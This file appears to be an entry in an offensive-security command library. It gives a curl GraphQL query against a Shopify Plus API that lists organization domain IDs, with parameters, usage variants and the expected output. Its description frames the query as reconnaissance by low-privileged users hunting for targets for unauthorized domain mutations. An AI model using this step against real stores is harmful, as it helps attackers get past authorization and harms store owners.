---
data: >-
  curl -X POST https://shopify.plus/34946971/stores/api -H "Content-Type:
  application/json" -H "Authorization: Bearer YOUR_TOKEN" -d
  '{"query":"query{organization{domains{id}}}"}'
tags:
  - graphql
  - query
  - shopify
type: command
output: null
executor: bash
platforms:
  - Web
  - Cloud
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:36.325Z'
id: 2dc3f095-3e2d-4986-8259-40f901934224
verified: false
validated: true
submitted: true
---
# shopify-graphql-query-organization-domains

## Command

```bash
curl -X POST https://shopify.plus/34946971/stores/api \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"query{organization{domains{id}}}"}'
```

## Description

GraphQL query to retrieve organization domain IDs from Shopify Plus API, used by low-privileged users to discover targets for unauthorized mutations.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method for GraphQL request | Yes |
| `https://shopify.plus/:org_id/stores/api` | Endpoint URL, replace :org_id | Yes |
| `-H "Authorization: Bearer YOUR_TOKEN"` | Auth header with session token | Yes |
| `query` | GraphQL query string for domains | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://shopify.plus/34946971/stores/api -H "Content-Type: application/json" -H "Authorization: Bearer token" -d '{"query":"query{organization{domains{id}}}"}'
```

### Advanced Usage

Add verbose output with `-v` flag for debugging:

```bash
curl -v -X POST https://shopify.plus/34946971/stores/api -H "Content-Type: application/json" -H "Authorization: Bearer token" -d '{"query":"query{organization{domains{id}}}"}'
```

## Expected Output

JSON response like {"data":{"organization":{"domains":[{"id":"gid://shopify/OrganizationDomain/123"}]}}}. Errors if unauthorized.

## Related

- [[commands/shopify-graphql-mutation-change-domain-enforcement]]
- [[procedures/Query-Domain-ID-as-Low-Privileged-User]]
